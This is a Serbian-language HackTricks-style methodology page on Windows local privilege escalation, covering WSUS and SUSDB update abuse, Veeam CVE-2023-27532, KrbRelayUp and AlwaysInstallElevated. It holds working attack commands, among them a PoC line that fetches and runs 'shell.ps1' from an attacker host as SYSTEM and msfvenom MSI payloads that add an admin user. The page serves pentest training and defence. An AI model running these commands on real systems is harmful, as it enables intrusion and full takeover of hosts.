# Eskalacija lokalnih privilegija u Windows-u

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za traženje vektora eskalacije lokalnih privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windows-u iz nekoliko osnovnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Njen praktični tok enumeracije oslanja se i na radionice i kontrolne liste zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata DerbyCon prezentaciju o eskalaciji privilegija u Windows-u.<sup>[[5]](#references)</sup>

## Osnovna teorija Windows-a

### Tokeni pristupa

**Ako ne znate šta su Windows tokeni pristupa, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Bezbednosne kontrole Windows-a

Windows sadrži različite stvari koje vas mogu **sprečiti da enumerišete sistem**, pokrećete izvršne datoteke ili čak **otkriti vaše aktivnosti**. Pre nego što počnete sa enumeracijom radi eskalacije privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **popišete** sve ove **odbrambene** **mehanizme**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup može omogućiti i pretvaranje izmena UEFI NVRAM-a van mreže u DMA pre pokretanja sistema i lanac izmena memorije Windows procesa `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / tiha eskalacija UIAccess-a

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje High IL-a bez upita, kada se zaobiđu provere bezbednih putanja AppInfo-a. Pogledajte namenski postupak za zaobilaženje UIAccess/Admin Protection-a ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija registra pristupačnosti Secure Desktop-a može se zloupotrebiti za proizvoljan upis u registar kao SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i LPE putanju za **SMB proizvoljnog porta**, gde se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo iskorišćene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li postoje poznate ranjivosti u verziji Windows-a (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Eksploiti specifični za verziju

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pronalaženje detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu za napad** koju Windows okruženje predstavlja.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — popisuje OS build, instalirane ispravke i odabrane moguće preporuke; proverite tačan proizvod i naknadne ispravke pre nego što rezultat smatrate primenljivim.

Za lokalni exploit specifičan za određenu verziju proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windows-u, 32-bitni proces podleže [WOW64 preusmeravanju sistema datoteka](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` se obično razrešava u 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup nativnom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. OS build ili kandidat za nedostajuću KB ispravku ne dokazuje da je sistem ranjiv na exploit; uporedite pokrenuti build, instaliranu ili naknadnu ispravku, arhitekturu procesa i preduslove exploita sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretnu ranjivost.

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repozitorijumi exploita:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neke akreditive ili vredne informacije sačuvane u promenljivama okruženja?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Istorija PowerShell-a

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript datoteke

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično čuva transkripte u fascikli Documents svakog korisnika, ali postavka `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da preusmeri datoteke u zajedničku ili skrivenu fasciklu. Pre nego što pregledate transkript, proverite efektivnu putanju za izlaz i ACL datoteke: transkript može da sadrži argumente komandi i izlaz, uključujući akreditive. Transkript koji možete da pročitate predstavlja samo trag ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama i ako taj identitet može da se prijavi u odgovarajućem kontekstu.

### PowerShell Module Logging

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku dokumentacije „Transcript files“ i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste prikazali poslednjih 15 događaja iz PowersShell evidencija, možete izvršiti:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se kompletna aktivnost i pun sadržaj izvršavanja skripte, čime se obezbeđuje dokumentovanje svakog bloka koda tokom njegovog izvršavanja. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaji za Script Block logging mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste videli poslednjih 20 događaja, možete koristiti:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Prethodne smernice su rizik sažele na sledeći način:

Možete kompromitovati sistem ako se ažuriranja ne zahtevaju preko http**S** već preko http.

HTTP WSUS krajnja tačka ukazuje na mogućnost presretanja metapodataka o ažuriranjima i zahteva dodatnu proveru. Eksploatacija zavisi i od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i od klijentovih pravila za poverenje u ažuriranja i njihovu instalaciju. Sam URL ne potvrđuje mogućnost izvršavanja koda. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpre proverite da li mreža koristi WSUS ažuriranje koje ne koristi SSL tako što ćete pokrenuti sledeće u cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od sledećih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Prvobitna izjava o primenljivosti glasila je:

Zatim je **exploitable.** Ako je poslednja vrednost registra jednaka 0, WSUS unos će biti zanemaren.

Kada je `UseWUServer` postavljen na `1`, Windows Update koristi konfigurisani intranet servis. Ovo potvrđuje jedan preduslov za putanju presretanja HTTP saobraćaja, ali ne dokazuje da su presretanje, prihvatanje zlonamernih ažuriranja ili instalacija sa povišenim privilegijama mogući. Kada je postavljen na `0`, ovaj konkretni konfigurisani WSUS endpoint nije izabran tom smernicom.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Ovo su MiTM weaponized exploit skripte za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji ne koristi SSL.

Pročitajte istraživanje ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Pročitajte kompletan izveštaj ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
U osnovi, ovo je propust koji ovaj bug iskorišćava:

> Ako možemo da menjamo proxy podešavanja lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima Internet Explorera, onda možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus), presretnemo sopstveni saobraćaj i pokrenemo kod na našem sistemu kao korisnik sa povišenim privilegijama.
>
> Pored toga, pošto WSUS servis koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako generišemo samopotpisani sertifikat za WSUS hostname i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme slične HSTS-u za validaciju sertifikata po principu „trust-on-first-use“. Ako korisnik veruje ponuđenom sertifikatu i ako on ima ispravan hostname, servis će ga prihvatiti.

Ovu ranjivost možete iskoristiti alatom [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja WSUS-a kojima upravlja administrator

Postoji zasebna putanja kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` na serveru i sva delegirana WSUS ovlašćenja, a zatim utvrdite koja grupa klijenata računara bi primila odobreno ažuriranje. [Microsoft zahteva privilegije WSUS Administrator za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a [dokumentuje i odnos poverenja za objavljivanje](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju sertifikatu za potpisivanje koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom za eskalaciju, potvrdite da je odgovarajuće ažuriranje potpisano i prihvaćeno, primenljivo na cilj i instalirano u kontekstu sa višim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuju ove uslove.

### Zloupotreba prilagođenih ažuriranja SUSDB-a: nepotpisani payload-и preko `.txt`/`.esd`

Ovo je drugačiji propust u granici poverenja od presretanja HTTP veze sa WSUS-om: preduslov je dovoljan pristup **uskladištenim procedurama WSUS baze podataka (`SUSDB`)** za objavljivanje i odobravanje prilagođenih ažuriranja. Jedan praktičan način da se dođe do pristupa jeste relay naloga računara WSUS-a ka uzvodnom serveru na zaseban MSSQL server na kom se nalazi `SUSDB`; tačan preduslov zavisi od konkretne implementacije, zato prvo utvrdite dozvole `EXECUTE` umesto da pretpostavite da su potrebna administratorska prava za SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu putanju napada koja relay-uje WSUS klijentsku autentifikaciju sa HTTP/8530 ka LDAP-u, SMB-u ili AD CS-u, pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potvrdite relay ka eksternoj bazi podataka i dozvole za procedure

U implementacijama u kojima WSUS koristi eksterni SQL Server, najpre proverite da li nalog WSUS servera može da se autentifikuje na bazi podataka i da li NTLM relay doseže taj listener. SQL uloga servera može da omogući pristup procedurama za objavljivanje ažuriranja čak i kada su direktna upisivanja u tabele zabranjena; neuspešan `UPDATE` nad `SUSDB` ne dokazuje da je objavljivanje blokirano. Pre pokušaja objavljivanja prilagođenog ažuriranja, proverite efektivni identitet, članstvo u ulogama i dozvole za procedure u ovlašćenoj SQL sesiji.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Definicije procedura uživo i instalirani `SoftwareDistributionPackage.xsd` korisni su pri rekonstrukciji važećih metapodataka ažuriranja. Nadređeni paket i podređeni payload moraju svaki da sadrže `UpdateIdentity` (tip fragmenta `1`), `LocalizedProperties` (`4`) i `ExtendedProperties` (`2`); zabeležite lokalni ID revizije koji vraća svaki poziv funkcije `spImportUpdate` i održavajte doslednost odnosa paketa, sažetaka, veličine, URL-a sadržaja i revizije. Ovo je proces objavljivanja sa stanjem, pa jedan uspešan poziv sačuvane procedure nije dokaz izvršavanja na strani klijenta.<sup>[[38]](#references)</sup>

#### Kreiranje, usmeravanje i odobravanje ažuriranja

Tok rada sa prilagođenim ažuriranjem koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne sačuvane procedure |
| --- | --- |
| Uvoz metapodataka ažuriranja | `spImportUpdate` |
| Čuvanje XML fragmenata sa preduslovima, lokalizovanim i proširenim podacima | `spSaveXMLFragment` |
| Povezivanje sažetka sadržaja sa URL-om koji kontroliše napadač | `spSetBatchURL` |
| Izlistavanje/kreiranje grupe računara i dodavanje klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobravanje instalacije za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Ime datoteke, sažeci, veličina i rukovalac `CommandLineInstallation` moraju biti usklađeni u uvezenim metapodacima i fragmentima. Nakon dodeljivanja URL-a sadržaja i ciljne grupe, konačno odobrenje izgleda ovako; koristite nove identifikatore ažuriranja, grupe i primene umesto ponovne upotrebe GUID primera.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje provere potpisa zasnovano na ekstenziji

WSUS obično odbacuje proizvoljan nepotpisani izvršni sadržaj. Međutim, u datoteci `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, putanja .NET metode `VerifyFile` postavlja zastavicu za proveru sertifikata na false kada se prosleđeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače, a da se prethodno ne utvrdi da li su bajtovi tekst ili legitimna ESD slika. Zato neizmenjeni PE fajl, na primer nazvan `payload.exe.txt`, može da prođe proveru sadržaja i kasnije bude pokrenut pomoću rukovaoca za instalaciju komandne linije ažuriranja. Ovo je greška u politici i zabuna u tipu, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Priprema i automatizacija kompatibilne sa BITS-om

Pozivanje funkcije `spDeployUpdate` navodi WSUS da preuzme registrovani sadržaj. Izvorni server mora da ispuni HTTP zahteve sistema BITS: sama dostupnost URL-a nije dovoljna jer prenos koristi početni tok `HEAD`/`GET` i zahteve za opsege bajtova. Server bez podrške za Range izaziva WSUS grešku sinhronizacije `EventId=364`, koja navodi da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac uvoza/fragmenta/URL-a/grupe/implementacije, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za pripremu sadržaja. Minimalni poziv u ovlašćenom laboratorijskom okruženju je:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nepraćeno izvršavanje i persistence ponovnih pokušaja

Interakcija na strani klijenta zavisi od pravila. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema konfigurisanom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čije ažuriranje nije uspelo ili je ostalo nedovršeno odmah je ponovo ponuđen nakon izlaska callback procesa, pa ponašanje pri ponovnom pokušaju može postati persistence kroz ponavljano izvršavanje; to je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Mogućnosti detekcije i hardeninga

Korisne mogućnosti provere na strani servera i klijenta u ovom lancu su:<sup>[[39]](#references)</sup>

- Revidirajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove ciljne grupe, eksterne izvore sadržaja, payload-e ažuriranja sa ekstenzijama `.txt`/`.esd` i deployment-e koje su izvršili neočekivani principal-i (naročito nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; uporedite verifikaciju sa ekstenzijom payload-a i potpisom sadržaja, umesto da verujete ekstenziji.
- Tražite slučajeve kada instalacija Windows Update-a više puta ne uspeva i ponavlja pokušaj, kao i izvršavanje PE fajlova ili neočekivanu aktivnost child procesa/mreže povezanu sa sadržajem koji ima nazive sa `.txt` ili `.esd` ekstenzijom.
- Zahtevajte Extended Protection for Authentication na servisu baze podataka gde je podržano i ograničite mrežni pristup bazi na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` dozvole za procedure za prilagođena ažuriranja na minimum i revidirajte ih.

## Ažuriranja trećih strana i Agent IPC (local privesc)

Mnogi enterprise agenti izlažu localhost IPC površinu i privilegovani kanal za ažuriranje. Ako se registracija može usmeriti ka serveru napadača, a updater veruje lažnom root CA sertifikatu ili koristi slabe provere potpisnika, lokalni korisnik može isporučiti zlonamerni MSI koji SYSTEM servis instalira. Pogledajte uopštenu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309) ovde:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Izvorni opis za određenu verziju i napomena o izviđanju bili su:

Veeam B&R < `11.0.1.1261` izlaže localhost servis na **TCP/9401**, koji obrađuje poruke pod kontrolom napadača, što omogućava izvršavanje proizvoljnih komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Izviđanje**: potvrdite listener i verziju, npr. pomoću `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect podrazumevano koriste osnovni backup servis na **TCP/9401**. [Veeam-ovo bezbednosno obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva baze konfiguracije unutar perimetra backup mreže; zaseban javni PoC demonstrira putanju do izvršavanja komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis može da se veže i izvan localhost-a, zato proverite njegovu stvarnu adresu i PID.

- **Izviđanje**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, a zatim proverite instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` su indikacije, ali ne predstavljaju potpunu proveru zakrpa.
- **Prve ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva izdanja sa ispravkom; prethodna izdanja su ranjiva. Sama četvorodelna verzija fajla ne može da razlikuje nezakrpljeni osnovni build od kasnije zakrpe za isti broj build-a. Pre nego što build na granici proglasite ispravljenim, proverite identifikator zakrpe u [istoriji build-ova proizvođača](https://www.veeam.com/kb2680).
- **Exploit**: smestite PoC, kao što je `VeeamHax.exe`, zajedno sa potrebnim Veeam DLL-ovima u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog socket-a:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Servis izvršava komandu kao SYSTEM.

Citirani PoC demonstrira izvršavanje komande kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja kredencijala.

## KrbRelayUp

Originalni opis podrazumevanog okruženja glasio je:

U Windows okruženjima **domena** postoji ranjivost **lokalnog podizanja privilegija** pod određenim uslovima. Ti uslovi obuhvataju okruženja u kojima **potpisivanje LDAP-a nije nametnuto**, korisnici imaju sopstvena prava koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD)** i korisnici mogu da kreiraju računare u domenu. Važno je napomenuti da su ovi **zahtevi** ispunjeni uz korišćenje **podrazumevanih postavki**.

Lokalni Kerberos relay može da omogući prelaz sa prijave sa nižim privilegijama na privilegovani upis u direktorijum kada se odgovarajući COM server autentifikuje, a prosleđeni principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih putanja. RBCD lanac zahteva odgovarajuća prava za delegiranje i nad ciljnim objektom, dok shadow-credential lanac zahteva prava za upis ključa i KDC koji podržava putanju autentifikacije pomoću sertifikata. Nijedna od ovih putanja ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za prosleđeni identitet i nivoe autentifikacije i impersonacije izabrane COM klase. Bitni su tip prijave pozivaoca i kontekst kredencijala: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim kredencijalima. Zaštitni zid/OXID rutiranje i instalirane ispravke takođe mogu da utiču na rezultat. Permisivnu smernicu ili odgovarajući ACL tretirajte kao razlog za proveru; pasivna enumeracija ne bi trebalo da pokreće COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential mašinskog naloga može da dovede do mašinske karte i, samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, do zasebne DCSync putanje.

Pronađite **exploit na** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim privilegijama mogu da **instaliraju** (izvršavaju) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up-a da biste u trenutnom direktorijumu kreirali Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI instalacioni program koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreiranu binarnu datoteku da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovih alata. Imajte na umu da možete obaviti wrapper-om datoteku "**.bat**" ako samo želite da **izvršite** **komandne linije**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- **Generišite** novi Windows EXE TCP payload pomoću Cobalt Strike-a ili Metasploit-a u `C:\privesc\beacon.exe`
